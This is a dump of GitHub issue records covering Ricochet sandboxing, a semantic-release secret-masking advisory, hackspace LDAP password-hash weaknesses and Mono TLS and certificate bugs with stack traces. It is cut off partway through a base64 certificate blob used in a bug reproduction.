","I've spent some time this weekend to launch Ricochet in the minijail sandbox. Once you have a policy file - it is as easy as installing and using minijail (HA!):

```
./minijail0 -n -S ricochet-seccomp-amd64.policy /usr/bin/ricochet
```

The above policy file is actually a superset of everything required for running `ricochet`, `tor` and `pulseaudio` under a single policy. If we were to add seccomp support to Ricochet properly, we'd be able to set different policies for different parts of the program - especially where we exec other programs.

I'll open a pull request for a contrib folder with this policy and a short README.
It seems that we can easily add some sandbox init code to Ricochet itself rather than using minijail. I'd ideally like to see people use the minijail policies and then we can see about adding seccomp support properly.
Any thoughts? Should I add seccomp directly into Ricochet?
How directly do the policies translate? Are minijail policies any more or less specific? If it's just a list of syscalls and an on/off toggle, there's not much value. If we're specifically whitelisting filesystem access and TCP sockets, that's more interesting. If we can prevent ricochet from being able to exec / launch a shell / etc, that's also useful. The hard part here will be figuring out the right policy, and keeping it up to date as software changes (Ricochet itself, but also Qt and the things it interacts with).

Eventually, we will want seccomp or an equivalent in Ricochet. It's much better than using an external tool.
",no,"enhancement,security,"
webtorrent/node-bencode,1267014380,"chore(deps): update dependency semantic-release to v19.0.3 [security]","[![Mend Renovate](https://app.renovatebot.com/images/banner.svg)](https://renovatebot.com)

This PR contains the following updates:

| Package | Change | Age | Adoption | Passing | Confidence |
|---|---|---|---|---|---|
| [semantic-release](https://togithub.com/semantic-release/semantic-release) | [`19.0.2` -> `19.0.3`](https://renovatebot.com/diffs/npm/semantic-release/19.0.2/19.0.3) | [![age](https://badges.renovateapi.com/packages/npm/semantic-release/19.0.3/age-slim)](https://docs.renovatebot.com/merge-confidence/) | [![adoption](https://badges.renovateapi.com/packages/npm/semantic-release/19.0.3/adoption-slim)](https://docs.renovatebot.com/merge-confidence/) | [![passing](https://badges.renovateapi.com/packages/npm/semantic-release/19.0.3/compatibility-slim/19.0.2)](https://docs.renovatebot.com/merge-confidence/) | [![confidence](https://badges.renovateapi.com/packages/npm/semantic-release/19.0.3/confidence-slim/19.0.2)](https://docs.renovatebot.com/merge-confidence/) |

### GitHub Vulnerability Alerts

#### [CVE-2022-31051](https://togithub.com/semantic-release/semantic-release/security/advisories/GHSA-x2pg-mjhr-2m5x)

### Impact
_What kind of vulnerability is it? Who is impacted?_

Secrets that would normally be masked by semantic-release can be accidentally disclosed if they contain characters that are excluded from uri encoding by [encodeURI](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI). Occurrence is further limited to execution contexts where push access to the related repository is not available without modifying the repository url to inject credentials.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Fixed in 19.0.3

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

Secrets that do not contain characters that are excluded from encoding with `encodeURI` when included in a URL are already masked properly.

### References
_Are there any links users can visit to find out more?_
* https://github.com/semantic-release/semantic-release/releases/tag/v19.0.3
* https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI

### For more information
If you have any questions or comments about this advisory:
* Open a discussion in [semantic-release discussions](https://togithub.com/semantic-release/semantic-release/discussions)

---

### Release Notes

<details>
<summary>semantic-release/semantic-release</summary>

### [`v19.0.3`](https://togithub.com/semantic-release/semantic-release/releases/tag/v19.0.3)

[Compare Source](https://togithub.com/semantic-release/semantic-release/compare/v19.0.2...v19.0.3)

##### Bug Fixes

-   **log-repo:** use the original form of the repo url to remove the need to mask credentials ([#&#8203;2459](https://togithub.com/semantic-release/semantic-release/issues/2459)) ([58a226f](https://togithub.com/semantic-release/semantic-release/commit/58a226f29c04ee56bbb02cc661f020d568849cad)), closes [#&#8203;2449](https://togithub.com/semantic-release/semantic-release/issues/2449)

</details>

---

### Configuration

📅 **Schedule**: Branch creation - """" (UTC), Automerge - At any time (no schedule defined).

🚦 **Automerge**: Enabled.

♻ **Rebasing**: Whenever PR becomes conflicted, or you tick the rebase/retry checkbox.

🔕 **Ignore**: Close this PR and you won't be reminded about this update again.

---

 - [ ] <!-- rebase-check -->If you want to rebase/retry this PR, click this checkbox.

---

This PR has been generated by [Mend Renovate](https://www.mend.io/free-developer-tools/renovate/). View repository job log [here](https://app.renovatebot.com/dashboard#github/webtorrent/node-bencode).",,yes,"security,"
londonhackspace/hackspace-foundation-sites,86287742,"the salt for the ldap SSHA hash needs to be more random","Afaict the salt is generated using Math.random(), which is bad.

There is a patch from upstream here to use the : https://code.google.com/p/crypto-js/issues/detail?id=21

Maybe this is better?

https://developer.mozilla.org/en-US/docs/Web/API/RandomSource/getRandomValues
",,no,"security,"
londonhackspace/hackspace-foundation-sites,117491301,"Replace ldap_add with an API","ldap_add.sh stops the www-data user from directly connecting to ldap, but all the real sanitisation is done in php. This means an invalid home directory, unsafe username, etc can be set if someone gets code execution on the server.

Replace it with an API that's only exposed internally, does sanitisation itself, and has direct admin access to ldap.
",,no,"security,"
londonhackspace/hackspace-foundation-sites,116557571,"Make ntlmv2 hash optional","This hash is likely to be of the same password as the bcrypted one, and so reduces the security of it. See also #105.
","Yes, I'm painfully aware of this :cry: but the alternative is to allow plain text passwords over spacenet and then do PAP auth, and since not everyone will verify the certificate from our radius server it would be easy for someone to set up a fake spacenet ssid and just grab passwords...

(of course with cloudcrack 'grab passwords' and 'grab ms-chapv2 exchanges' are pretty much the same thing :disappointed: ).

In an ideal world there would be an EAP-*-SASL mechanisim and then we could use SCRAM-SHA1-PLUS, which has channel verification and so kills to birds with one stone. But unfortunatly vendor's C and M continue to squabble so we don't :/ :disappointed: 

The other option is to use client side certs...

P.S. the hash's stored in ldap for the main auth is SSHA, there is a way to use the hash's used by the OS's crypt() function (The $X$wibble stuff), which could get us bcrypt, but we'd need to check that it works with all our apps.

In anycase I'll be playing with ldap stuff soonish to get it all in ansible (and move the ldap server to adminstuff or somewhere), so i'll have a look at that then.
What would happen if we set sambaNTPassword to `!`, like we do sambaLMPassword?
Then ms-chap-v2 auth would fail on spacenet cos freeradius won't have either a plain text password or an NTLMv2 hash to compare against.

Hmm, looks like windows won't support PAP?

https://spacefed.net/wiki/index.php/Howto/Spacenet/Client_Windows_7
I think I've misunderstood something here. Are you saying we should force people to provide an NTLMv2 password because they should be using spacenet? Or that a radius server somewhere will crash because a user without an NTLMv2 password exists?
People don't have to use spacenet if they don't want to.

The radius server won't crash, it just won't be able to authenticate the user.

If you want to add code that a blank ntlmv2 password ends up in LDAP as '!' that would be fine, but it would need a warning on the LDAP page that then they won't be able to use spacenet.

Also if you want to add a check on the ldap page (in the javascript) that ssha_password != ntlmv2 password and refuse to add the passwords if not that would be good too.
",no,"security,"
syvineckruyk/yk_blog,1797544,"create and edit forms to auto detect user_id","need create and edit forms to auto detect user_id
",,no,"layout,application,security,"
syvineckruyk/yk_blog,1797340,"mask s3 info from git and github","mask s3 info from git and github
",,no,"layout,application,security,"
mono/mono,300819654,"Lack/custom machine.config can cause AuthenticodeDeformatter to fail (and be quite hard to diagnose)","Follow up of https://github.com/xamarin/xamarin-macios/issues/3207

## Steps to Reproduce

1.  Add a MD2 based X509 certificate if Mono's trust store
2. Run Mono.Security.dll unit tests

or try to validate an authenticode signature that has refers to an CA using an MD2-based signature. That might sound out-of-date (it is) but since timestamps are used it's still possible for someone to want to validate the signature was correct (at the time of the timestamp).

## Current Behavior

```
1) VerifySignedAssembly (MonoTests.Mono.Security.Authenticode.AuthenticodeDeformatterTest.VerifySignedAssembly)
     Reason
  Expected: True
  But was:  False

  at MonoTests.Mono.Security.Authenticode.AuthenticodeDeformatterTest.VerifySignedAssembly () [0x0000f] in /Users/builder/data/lanes/1381/c7c356c3/source/xamarin-macios/external/mono/mcs/class/Mono.Security/Test/Mono.Security.Authenticode/AuthenticodeDeformatterTest.cs:703 
  at (wrapper managed-to-native) System.Reflection.MonoMethod.InternalInvoke(System.Reflection.MonoMethod,object,object[],System.Exception&)
  at System.Reflection.MonoMethod.Invoke (System.Object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, System.Object[] parameters, System.Globalization.CultureInfo culture) [0x00032] in /Library/Frameworks/Xamarin.Mac.framework/Versions/4.3.0.36/src/Xamarin.Mac/mcs/class/corlib/System.Reflection/MonoMethod.cs:305 
```

## Expected Behavior

Any clue about what went wrong, i.e. Mono could not create an `MD2` instance.


### On which platforms did you notice this

[X] macOS
[ ] Linux
[ ] Windows

**Version Used**:

Any mono in the past 13 years (maybe more).

### Stacktrace

```
[0x700001007000:] EXCEPTION handling: System.NullReferenceException: Object reference not set to an instance of an object

""Threadpool worker"" tid=0x0x700001007000 this=0x0x103bd4508 , thread handle : 0x7fbee2f35d10, state : not waiting
  at Mono.Security.X509.X509Certificate.get_Hash () [0x0004b] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/Mono.Security/Mono.Security.X509/X509Certificate.cs:301
  at Mono.Security.X509.X509CertificateCollection.IndexOf (Mono.Security.X509.X509Certificate) [0x0002b] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/Mono.Security/Mono.Security.X509/X509CertificateCollection.cs:126
  at Mono.Security.X509.X509CertificateCollection.Contains (Mono.Security.X509.X509Certificate) [0x00000] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/Mono.Security/Mono.Security.X509/X509CertificateCollection.cs:95
  at Mono.Security.X509.X509Chain.IsTrusted (Mono.Security.X509.X509Certificate) [0x00000] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/Mono.Security/Mono.Security.X509/X509Chain.cs:256
  at Mono.Security.X509.X509Chain.FindCertificateRoot (Mono.Security.X509.X509Certificate) [0x00010] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/Mono.Security/Mono.Security.X509/X509Chain.cs:233
  at Mono.Security.X509.X509Chain.Build (Mono.Security.X509.X509Certificate) [0x00042] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/Mono.Security/Mono.Security.X509/X509Chain.cs:137
  at Mono.Security.Authenticode.AuthenticodeDeformatter.VerifySignature (Mono.Security.PKCS7/SignedData,byte[],System.Security.Cryptography.HashAlgorithm) [0x001d1] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/Mono.Security/Mono.Security.Authenticode/AuthenticodeDeformatter.cs:329
  at Mono.Security.Authenticode.AuthenticodeDeformatter.CheckSignature (string) [0x001a5] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/Mono.Security/Mono.Security.Authenticode/AuthenticodeDeformatter.cs:236
  at Mono.Security.Authenticode.AuthenticodeDeformatter.set_FileName (string) [0x00006] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/Mono.Security/Mono.Security.Authenticode/AuthenticodeDeformatter.cs:82
  at Mono.Security.Authenticode.AuthenticodeDeformatter..ctor (string) [0x00006] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/Mono.Security/Mono.Security.Authenticode/AuthenticodeDeformatter.cs:74
  at MonoTests.Mono.Security.Authenticode.AuthenticodeDeformatterTest.VerifySignedAssembly () [0x00008] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/Mono.Security/Test/Mono.Security.Authenticode/AuthenticodeDeformatterTest.cs:700
  at (wrapper runtime-invoke) object.runtime_invoke_void__this__ (object,intptr,intptr,intptr) [0x0004f] in <8f6f4dc1da6b4cb2b14c6cca0cbcae3b>:0
  at <unknown> <0xffffffff>
  at (wrapper managed-to-native) System.Reflection.MonoMethod.InternalInvoke (System.Reflection.MonoMethod,object,object[],System.Exception&) [0x00016] in <8f6f4dc1da6b4cb2b14c6cca0cbcae3b>:0
  at System.Reflection.MonoMethod.Invoke (object,System.Reflection.BindingFlags,System.Reflection.Binder,object[],System.Globalization.CultureInfo) [0x00032] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/corlib/System.Reflection/MonoMethod.cs:305
  at System.Reflection.MethodBase.Invoke (object,object[]) [0x00000] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/referencesource/mscorlib/system/reflection/methodbase.cs:229
  at NUnit.Framework.Internal.Reflect/<>c__DisplayClass9_0.<InvokeMethod>b__0 () [0x00000] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/Reflect.cs:226
  at GuiUnit.InvokerHelper.Invoke () [0x0000e] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/GuiUnit/InvokerHelper.cs:18
  at Xamarin.Mac.Tests.MainClass/NSRunLoopIntegration.InvokeOnMainLoop (GuiUnit.InvokerHelper) [0x00001] in /work/maccore/master/xamarin-macios/tests/common/mac/MacTestMain.cs:98
  at NUnit.Framework.Internal.Reflect.InvokeMethod (System.Reflection.MethodInfo,object,object[]) [0x000f2] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/Reflect.cs:229
  at NUnit.Framework.Internal.Commands.TestMethodCommand.RunNonAsyncTestMethod (NUnit.Framework.Internal.TestExecutionContext) [0x00001] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/Commands/TestMethodCommand.cs:114
  at NUnit.Framework.Internal.Commands.TestMethodCommand.RunTestMethod (NUnit.Framework.Internal.TestExecutionContext) [0x0001f] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/Commands/TestMethodCommand.cs:90
  at NUnit.Framework.Internal.Commands.TestMethodCommand.Execute (NUnit.Framework.Internal.TestExecutionContext) [0x00001] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/Commands/TestMethodCommand.cs:66
  at NUnit.Framework.Internal.Commands.SetUpTearDownCommand.Execute (NUnit.Framework.Internal.TestExecutionContext) [0x0000a] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/Commands/SetUpTearDownCommand.cs:84
  at NUnit.Framework.Internal.WorkItems.SimpleWorkItem.PerformWork () [0x00002] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/WorkItems/SimpleWorkItem.cs:68
  at NUnit.Framework.Internal.WorkItems.WorkItem.RunTest () [0x00060] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/WorkItems/WorkItem.cs:230
  at NUnit.Framework.Internal.WorkItems.WorkItem.Execute () [0x00063] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/WorkItems/WorkItem.cs:176
  at NUnit.Framework.Internal.WorkItems.CompositeWorkItem.RunChildren () [0x00039] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/WorkItems/CompositeWorkItem.cs:133
  at NUnit.Framework.Internal.WorkItems.CompositeWorkItem.PerformWork () [0x000ba] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/WorkItems/CompositeWorkItem.cs:88
  at NUnit.Framework.Internal.WorkItems.WorkItem.RunTest () [0x00060] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/WorkItems/WorkItem.cs:230
  at NUnit.Framework.Internal.WorkItems.WorkItem.Execute () [0x00063] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/WorkItems/WorkItem.cs:176
  at NUnit.Framework.Internal.WorkItems.CompositeWorkItem.RunChildren () [0x00039] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/WorkItems/CompositeWorkItem.cs:133
  at NUnit.Framework.Internal.WorkItems.CompositeWorkItem.PerformWork () [0x000ba] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/WorkItems/CompositeWorkItem.cs:88
  at NUnit.Framework.Internal.WorkItems.WorkItem.RunTest () [0x00060] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/WorkItems/WorkItem.cs:230
  at NUnit.Framework.Internal.WorkItems.WorkItem.Execute () [0x00063] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/WorkItems/WorkItem.cs:176
  at NUnit.Framework.Internal.NUnitLiteTestAssemblyRunner.Run (NUnit.Framework.Api.ITestListener,NUnit.Framework.Api.ITestFilter) [0x0005b] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/Internal/NUnitLiteTestAssemblyRunner.cs:134
  at GuiUnit.TestRunner.RunTests (NUnit.Framework.Api.ITestFilter) [0x00001] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/GuiUnit/TestRunner.cs:347
  at GuiUnit.TestRunner/<>c__DisplayClass21_0.<ExecuteWithListener>b__0 (object) [0x00002] in /work/maccore/master/xamarin-macios/external/guiunit/src/framework/GuiUnit/TestRunner.cs:227
  at System.Threading.QueueUserWorkItemCallback.WaitCallback_Context (object) [0x0000d] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/referencesource/mscorlib/system/threading/threadpool.cs:1306
  at System.Threading.ExecutionContext.RunInternal (System.Threading.ExecutionContext,System.Threading.ContextCallback,object,bool) [0x00071] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/referencesource/mscorlib/system/threading/executioncontext.cs:957
  at System.Threading.ExecutionContext.Run (System.Threading.ExecutionContext,System.Threading.ContextCallback,object,bool) [0x00000] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/referencesource/mscorlib/system/threading/executioncontext.cs:904
  at System.Threading.QueueUserWorkItemCallback.System.Threading.IThreadPoolWorkItem.ExecuteWorkItem () [0x00021] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/referencesource/mscorlib/system/threading/threadpool.cs:1283
  at System.Threading.ThreadPoolWorkQueue.Dispatch () [0x00074] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/referencesource/mscorlib/system/threading/threadpool.cs:856
  at System.Threading._ThreadPoolWaitCallback.PerformWaitCallback () [0x0001c] in /work/maccore/master/xamarin-macios/external/mono/mcs/class/referencesource/mscorlib/system/threading/threadpool.cs:1211
  at (wrapper runtime-invoke) <Module>.runtime_invoke_bool (object,intptr,intptr,intptr) [0x0001f] in <8f6f4dc1da6b4cb2b14c6cca0cbcae3b>:0```
","@rolfbjarne has a part of the fix
I can provide the 2nd parthttps://gist.github.com/spouliot/5640ab850d0b9359bdf5cceb48d54f95 (untested) would fix the 2nd part, instead of throwing an NRE the exception would explain what went wrong and how to fix it",no,"area-BCL: Mono.Security,"
mono/mono,317711530,"Intermittent failures of SslStreamTest.AuthenticateClientAndServer_ClientSendsNoData","Possibly a regression as the first instance we are aware of is Apr 19.

### Example logs
https://jenkins.mono-project.com/job/test-mono-pull-request-armel/12481/testReport/junit/(root)/SslStreamTest/AuthenticateClientAndServer_ClientSendsNoData/

### Stacktrace

```
MESSAGE:
System.IO.IOException : The authentication or decryption has failed.
  ----> System.IO.IOException : Error while sending TLS Alert (Fatal:InternalError): System.IO.IOException: The authentication or decryption has failed. ---> System.ObjectDisposedException: Cannot access a disposed object.
Object name: 'System.Net.Sockets.NetworkStream'.
  at Mono.Security.Protocol.Tls.RecordProtocol.EndReceiveRecord (System.IAsyncResult asyncResult) [0x00049] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/Mono.Security/Mono.Security.Protocol.Tls/RecordProtocol.cs:434 
  at Mono.Security.Protocol.Tls.SslClientStream.SafeEndReceiveRecord (System.IAsyncResult ar, System.Boolean ignoreEmpty) [0x00000] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/Mono.Security/Mono.Security.Protocol.Tls/SslClientStream.cs:256 
  at Mono.Security.Protocol.Tls.SslClientStream.NegotiateAsyncWorker (System.IAsyncResult result) [0x00071] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/Mono.Security/Mono.Security.Protocol.Tls/SslClientStream.cs:418 
   --- End of inner exception stack trace ---
  at Mono.Security.Protocol.Tls.SslClientStream.EndNegotiateHandshake (System.IAsyncResult result) [0x00033] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/Mono.Security/Mono.Security.Protocol.Tls/SslClientStream.cs:397 
  at Mono.Security.Protocol.Tls.SslStreamBase.AsyncHandshakeCallback (System.IAsyncResult asyncResult) [0x0000c] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/Mono.Security/Mono.Security.Protocol.Tls/SslStreamBase.cs:101 
  ----> System.ObjectDisposedException : Cannot access a disposed object.
Object name: 'System.Net.Sockets.NetworkStream'.
+++++++++++++++++++
STACK TRACE:
                         at Mono.Security.Protocol.Tls.SslStreamBase.EndRead (System.IAsyncResult asyncResult) [0x0004c] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/Mono.Security/Mono.Security.Protocol.Tls/SslStreamBase.cs:886 
  at Mono.Net.Security.Private.LegacySslStream.EndAuthenticateAsClient (System.IAsyncResult asyncResult) [0x0000e] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/System/Mono.Net.Security/LegacySslStream.cs:477 
  at Mono.Net.Security.Private.LegacySslStream.AuthenticateAsClient (System.String targetHost, System.Security.Cryptography.X509Certificates.X509CertificateCollection clientCertificates, System.Security.Authentication.SslProtocols enabledSslProtocols, System.Boolean checkCertificateRevocation) [0x00000] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/System/Mono.Net.Security/LegacySslStream.cs:447 
  at Mono.Net.Security.Private.LegacySslStream.AuthenticateAsClient (System.String targetHost) [0x00000] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/System/Mono.Net.Security/LegacySslStream.cs:442 
  at System.Net.Security.SslStream.AuthenticateAsClient (System.String targetHost) [0x00000] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/System/System.Net.Security/SslStream.cs:149 
  at MonoTests.System.Net.Security.SslStreamTest.StartClientAndAuthenticate (MonoTests.System.Net.Security.SslStreamTest+ClientServerState state, System.Net.IPEndPoint endPoint) [0x00085] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/System/Test/System.Net.Security/SslStreamTest.cs:115 
  at MonoTests.System.Net.Security.SslStreamTest+<>c__DisplayClass6_0.<AuthenticateClientAndServer>b__1 () [0x00000] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/System/Test/System.Net.Security/SslStreamTest.cs:84 
  at System.Threading.ThreadHelper.ThreadStart_Context (System.Object state) [0x00014] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/referencesource/mscorlib/system/threading/thread.cs:68 
  at System.Threading.ExecutionContext.RunInternal (System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, System.Object state, System.Boolean preserveSyncCtx) [0x00071] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/referencesource/mscorlib/system/threading/executioncontext.cs:961 
  at System.Threading.ExecutionContext.Run (System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, System.Object state, System.Boolean preserveSyncCtx) [0x00000] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/referencesource/mscorlib/system/threading/executioncontext.cs:908 
  at System.Threading.ExecutionContext.Run (System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, System.Object state) [0x0002b] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/referencesource/mscorlib/system/threading/executioncontext.cs:897 
  at System.Threading.ThreadHelper.ThreadStart () [0x00008] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/referencesource/mscorlib/system/threading/thread.cs:105 
--IOException

--ObjectDisposedException
  at System.Net.Sockets.NetworkStream.BeginWrite (System.Byte[] buffer, System.Int32 offset, System.Int32 size, System.AsyncCallback callback, System.Object state) [0x000e7] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/referencesource/System/net/System/Net/Sockets/NetworkStream.cs:959 
  at Mono.Security.Protocol.Tls.RecordProtocol.BeginSendRecord (Mono.Security.Protocol.Tls.ContentType contentType, System.Byte[] recordData, System.AsyncCallback callback, System.Object state) [0x00023] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/Mono.Security/Mono.Security.Protocol.Tls/RecordProtocol.cs:765 
  at Mono.Security.Protocol.Tls.RecordProtocol.SendRecord (Mono.Security.Protocol.Tls.ContentType contentType, System.Byte[] recordData) [0x00000] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/Mono.Security/Mono.Security.Protocol.Tls/RecordProtocol.cs:786 
  at Mono.Security.Protocol.Tls.RecordProtocol.SendAlert (Mono.Security.Protocol.Tls.Alert alert) [0x00021] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/Mono.Security/Mono.Security.Protocol.Tls/RecordProtocol.cs:633 
  at Mono.Security.Protocol.Tls.RecordProtocol.SendAlert (System.Exception& ex) [0x0001b] in /home/builder/jenkins/workspace/test-mono-pull-request-armel/mcs/class/Mono.Security/Mono.Security.Protocol.Tls/RecordProtocol.cs:598 

```
","Whatever makes that test use Legacy TLS needs to be changed to not do that.",no,"flaky issue,area-BCL: Mono.Security,"
mono/mono,286286599,"Can't run nuget.exe on windows using mono","## Steps to Reproduce

1. Install mono 5.4.1 x64 on windows
2. Cd to C:\Program Files\Mono\lib\mono\nuget
3. command: mono nuget.exe install docfx (or whatever)

## Current Behavior

Command:
> PS C:\Program Files\Mono\lib\mono\nuget> mono nuget.exe install docfx

Resulting in:
> Feeds used:
>   https://api.nuget.org/v3/index.json
>   C:\Program Files (x86)\Microsoft SDKs\NuGetPackages\
> Unable to load the service index for source https://api.nuget.org/v3/index.json.
>   An error occurred while sending the request
>   Error: TrustFailure (The authentication or decryption has failed.)
>   The authentication or decryption has failed.
>   Invalid certificate received from server. Error code: 0xffffffff800b0109

## Expected Behavior
Package installed

### On which platforms did you notice this

[ ] macOS
[ ] Linux
[x ] Windows

**Version Used**:

5.4.1 (Visual Studio built mono)

### Stacktrace

NA


  ","I'll have a look at it when I'm back in Boston (next week or the week after depending on weather), since I need my Windows workstation for this, I can't do anything about it remotely.@baulig did you look into this issue?No, I completely forgot about this one.Thinking about it, I'm not sure whether we build / ship BTLS on Windows - we did on various Linux systems, but I don't remember ever doing it for Windows.  So unless somebody else ported / enabled BTLS on Windows, then NuGet will simply not be supported on this platform.

I could investigate how much work it'd be to do that, but it'd have to wait until next week as I'm busy fixing issue #6788 and integrating the monthly branch.",no,"area-BCL: System.Security,"
mono/mono,618026378,"Mono.Btls.MonoBtlsProvider has invalid vtable method","I upgraded my project from Mono 5.18.1 to Mono 6.8.0 and now I get the exception ` Mono.Btls.MonoBtlsProvider has invalid vtable method`

My motivation of this upgrade was to enable the use of TLS 1.2.

## Steps to Reproduce

> This is a different eception as I experience, but I is poiting to `Mono.Btls` too.

```
class Program
{
    private const string Pfx = ""MIIKYgIBAzCCCg4GCSqGSIb3DQEHAaCCCf8Eggn7MIIJ9zCCBlIGCSqGSIb3DQEHAaCCBkMEggY/MIIGOzCCBjcGCyqGSIb3DQEMCgECoIIFQTCCBT0wVwYJKoZIhvcNAQUNMEowKQYJKoZIhvcNAQUMMBwECG2z5+LgOWCfAgIH0DAMBggqhkiG9w0CCQUAMB0GCWCGSAFlAwQBKgQQ9BvjwIXOXBLh7EkQxvOGnASCBOCPWalT8a2zPuuhHiojvbHnENBVGhsEBBaLK5sQggWLzd/GPSgVRiuky8/MwjGByzASArvvvc3ROefn+YR8moALl0vMj2wQQM6uVIE9UOER2rL74YCUxzDjFvveRSvMRvtcrxRfK2gOJUVdqJn5Pq4XXKxiIuLFwEAjjjDNbhdoFMTedA4mOX7wbuSd2Pz1nzl9SJaebUdTJTt5/zLGSM21pBMQJZWbfMpzceGBSuNOlJ1bn0TC6aERbKzYgtVzyFAkWL+qiXEWPePw9vZTGI/8MrCWopqsRnftESyaZthSB7kHJ/zy8SnD3J5wDzfbP22Oviu8c8pdbs7KTMYfvR7eObesBAsD+bPJHCE/Yabtd7RS+54jNJn7RH0DsCHWhK9IvnTnMFwLnwTpR7lXKol6M00dgUp0MCCNzGC5zaNH+ZDmB9O8XOZsXnEp39YA2XnMAroIO4GcyAppDAuzt4P7Xm84rkGaYw2kxsB7+FwhXMxHi7U+RI+nRp4kl4XfpZ0X/JYVJPOfLWzCugIyBYbZ8w6UpnupSkSdvhGlydngfj8CT5riTlaK8T/nW1cuy8TbgVZBxbFH0lg7kHfWML5JCweeBjCS3F/KsVaQQ6u2Oj0AGtl9z6WHQnEjoQGEU2vQSK+YVQtRZeEKf6t7ArhhFyGl6wvKKIFY/FT/2ZHVHxDXlELLk+JAjlLIVkI21jK7wto62pYvukD/TcBMUXswGLmkvU+KhMF8Lxo+M784HUoWVuX7D7L8rYJAQKIREbvacNiRki/3KlDplaLz5s3CUP1cAhmXy0YoWggHVgqg+NLrTMHOp8ixwO0ny2ikSD0ufyK5GZApXjNwomFw321Vy1iC84aDHiBPhOCS2mUoWCQkUDWvgznwWieLhOnp46PIrJETUyma3cZZoxiAWa9VgBOqrTvXNbov0xVQiDo7hQb31cbW0QIyPr3VucO/IqNCsao6414tmdWsP6V5F/uJwx1sprsPoRo+MF4gT6LyVx2u+vZkQXF4n3olUtDmF9Niy3upze2iD8WW+O6IpuNLB1YxiahEXAgfa1TDfjeufEa0iL3aZlvgORiikmRnB2gYuVc/SYvWFSriA+WSf1p5EwWO4BctAsv43SAliL+2lpPjmZy70sYlK5mMbvHoP1D6oR0lWro7K/N+4Pk0Sw3i0O6D0QgdIaF5HGI19AfW4/H6xueB5+OXWx4di3yiWjP7nWEXyOWIuY8J6Zs3Sbi1OXPlkIVesp52IZjys+20jcUHPkfbYsCQxOSUZtCa9hl4Slw0e9dwb7w0QloqTTShMyk8dFLB1BTBrnYUHpahfvHJPtz5zRptk/kDoO4kGV0SqMwK1rRXMtQqHMfUr6SLUGWG4M55rKT3+VPCHA+Ion7jA7yUtRps/AP91NG4EP4VezR4scAgYLUpoE7BKJGyAgRwXg2GrWhhJDxZgea3U6W+EqXnNlY+FagtWqGy48u9cWACoKMzvbENO2LmBJ9b5Q/A/4RhNr1zo48eSkX/M2+zN5XY+uzmWfimm3GyqVZ4rODxY+xjjOdR7t9MSR6V3WpqVDTmFgNXO8ix5FKWL14M2hTPt213FmjTP21n3epxq6LUysx61J9/mM8Tkh7m1fWCgnz13unkVFS3HkjHk21lSEj7lj5Q